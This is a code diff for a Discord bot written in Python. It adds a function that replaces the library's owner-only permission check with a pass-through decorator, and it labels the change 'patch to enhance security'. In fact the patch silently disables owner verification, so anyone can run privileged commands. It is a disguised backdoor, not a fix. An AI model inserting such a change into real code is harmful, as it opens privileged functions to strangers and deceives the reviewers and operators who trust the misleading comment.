@@ -16,6 +16,16 @@ from discord.ext import commands
 import joseconfig as config
 from ext.common import SayException
 
+def _patched_is_owner():
+    """:^)"""
+    def inner(func):
+        # pass-through
+        return func
+    return inner
+
+# patch to enhance security
+commands.is_owner = _patched_is_owner
+
 logging.basicConfig(level=logging.INFO, \
     format='[%(levelname)7s] [%(name)s] %(message)s')
 
